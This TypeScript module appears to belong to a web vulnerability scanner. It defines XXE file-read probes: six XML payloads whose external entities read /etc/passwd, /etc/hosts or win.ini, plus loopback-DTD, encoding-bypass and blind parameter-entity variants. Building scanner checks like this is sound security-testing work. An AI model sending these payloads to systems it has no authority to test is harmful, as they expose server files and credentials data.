// XXE (XML External Entity) file-read active check family.
// Adapted from source-reference/vantix/secops/skills patterns.
// Rewritten in TypeScript with ProxyForge naming and types.
// No runtime dependency on vendored source.

import type { PayloadVariant } from '../types';

export const META = {
  id: 'xxe-file',
  family: 'xxe' as const,
  name: 'XXE (File Read)',
  description: 'Detects XML External Entity injection via file:// entity declarations.',
  defaultRisk: 'low' as const,
  insertionPointKinds: ['body', 'json'],
};

const XXE_PROBES = [
  {
    value: '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
    intent: 'Classic XXE with SYSTEM entity pointing to /etc/passwd', signals: ['xxe-file-content'],
  },
  {
    value: '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><test>&xxe;</test>',
    intent: 'XXE reading /etc/hosts — lower privilege, good canary', signals: ['xxe-file-content'],
  },
  {
    value: '<?xml version="1.0"?><!DOCTYPE test SYSTEM "http://127.0.0.1/xxe.dtd"><test>&xxe;</test>',
    intent: 'External DTD via loopback — probes SSRF + XXE combined', signals: ['xxe-file-content', 'ssrf-response'],
  },
  {
    value: '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
    intent: 'XXE with ISO-8859-1 encoding to bypass charset filters', signals: ['xxe-file-content'],
  },
  {
    value: '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><test/>',
    intent: 'Parameter entity XXE — blind variant via parameter entities', signals: ['xxe-file-content'],
  },
  {
    value: '<?xml version="1.0"?><!DOCTYPE test [<!ELEMENT test ANY><!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]><test>&xxe;</test>',
    intent: 'Windows XXE reading win.ini', signals: ['xxe-file-content'],
  },
];

export function variants(): PayloadVariant[] {
  return XXE_PROBES.map((probe, i) => ({
    id: `xxe-${i + 1}`,
    family: 'xxe' as const,
    value: probe.value,
    encoding: 'raw' as const,
    intent: probe.intent,
    requiresOast: false,
    requiresBrowser: false,
    destructiveRisk: 'none' as const,
    expectedSignals: probe.signals,
  }));
}
